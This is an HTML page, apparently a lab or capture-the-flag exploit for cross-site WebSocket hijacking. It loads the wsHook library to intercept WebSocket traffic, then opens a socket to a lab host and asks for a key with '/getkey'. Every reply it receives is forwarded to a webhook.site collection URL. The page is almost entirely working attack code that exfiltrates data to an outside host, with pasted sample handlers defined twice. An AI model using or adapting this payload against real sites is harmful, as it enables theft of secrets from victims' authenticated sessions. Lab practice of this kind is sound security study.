<html>
<body>
<script src='wsHook.js'></script>
<script>
  wsHook.before = function(data, url, wsObject) {
    console.log("Sending message to " + url + " : " + data);
}

// Make sure your program calls `wsClient.onmessage` event handler somewhere.
wsHook.after = function(messageEvent, url, wsObject) {
    console.log("Received message from " + url + " : " + messageEvent.data);
    return messageEvent;
}

// if you do not want to propagate the MessageEvent further down, just return null
wsHook.after = function(messageEvent, url, wsObject) {
 console.log("Received message from " + url + " : " + messageEvent.data);
 // This example can ping-pong forever, so maybe use some conditions
 wsObject.send("Intercepted and sent again")
 return null;
}

var wsClient = new WebSocket("wss://ptl-44a879316cb2-d0b2db620353.libcurl.me/");
wsClient.onopen = function () {
  wsClient.send('{"text":"/getkey"}');
}

wsClient.onmessage = function(e){
  var x = new XMLHttpRequest();
  x.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?test="+e,true);
  x.send(null);
}

</script>
  
</body>
</html>
